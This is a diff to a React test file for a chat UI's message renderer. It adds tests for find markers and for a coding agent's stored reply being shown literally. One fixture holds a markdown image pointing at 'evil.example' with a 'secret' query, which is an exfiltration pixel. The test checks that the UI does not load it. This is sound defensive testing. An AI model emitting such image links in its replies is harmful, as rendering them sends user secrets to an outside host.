@@ -8,6 +8,10 @@ import type { ChatMessage } from "@neore/chat-ui/types";
 import { fireEvent, render, screen } from "@testing-library/react";
 import { describe, expect, it, vi } from "vitest";
 
+import { toUIMessages } from "@/lib/agent";
+
+import { buildHostReply } from "../../../../../../backend/lunora/acp/lib/reply";
+
 // Unit tests do not compile the Lingui macros; chat-ui's rows call `useLingui`.
 vi.mock("@lingui/react/macro", () => {
     return {
@@ -50,6 +54,18 @@ describe("message content tool call rows", () => {
     });
 });
 
+describe("message content text parts", () => {
+    it("marks each text part for in-thread find, and nothing else", () => {
+        const { container } = render(<MessageContentUI message={message("the answer")} />);
+
+        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about DOM structure
+        const marked = container.querySelectorAll("[data-find-text]");
+
+        expect(marked).toHaveLength(1);
+        expect(marked[0]?.textContent).toContain("the answer");
+    });
+});
+
 describe("message content file previews", () => {
     it("wraps an embedded file in .message-text-fixed, so the chat text size does not resize its controls", () => {
         const withFile = {
@@ -63,5 +79,27 @@ describe("message content file previews", () => {
 
         // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about DOM structure
         expect(container.querySelector(".message-text-fixed")).not.toBeNull();
+    });
+});
+
+describe("a coding agent's stored reply", () => {
+    it("stays literal from the saved row through toUIMessages to the page: no remote image is loaded", () => {
+        const reply = buildHostReply({
+            agentKey: "claude",
+            reason: "finished",
+            transcript: {
+                children: [],
+                media: [],
+                reasoning: "",
+                text: "Chart ![c](out/chart.png) and a pixel ![](https://evil.example/?q=secret).",
+            },
+        });
+        const row = { ...reply, _creationTime: 1, _id: "m1", order: 1, stepOrder: 0, threadId: "t1", tool: false, userId: "u1" };
+        const [ui] = toUIMessages([row as never]);
+        const { container } = render(<MessageContentUI message={ui as unknown as ChatMessage} />);
+
+        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about what the DOM may fetch
+        expect(container.querySelector("img")).toBeNull();
+        expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
     });
 });
